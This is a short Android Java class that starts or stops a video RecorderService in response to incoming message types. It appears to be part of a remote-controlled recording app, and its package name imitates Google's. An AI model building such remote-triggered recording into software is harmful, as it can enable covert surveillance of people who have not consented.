package com.google.core.msgpro;

import com.alibaba.fastjson.JSONObject;
import com.google.core.domain.MsgType;
import com.google.core.service.RecorderService;

import android.content.Context;
import android.content.Intent;

public class VideoMsgPro {

	private Context context;

	public VideoMsgPro(Context context) {
		this.context = context;
	}

	public void doPro(int type, String data) {
		Intent intent = new Intent(context, RecorderService.class);
		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		switch (type) {
		case MsgType.START_VIDEO_RECODER:
			// 开始录像
			context.startService(intent);
			break;
		case MsgType.STOP_VIDEO_RECODER:
			// 停止录像
			context.stopService(intent);
			break;

		}
	}
}
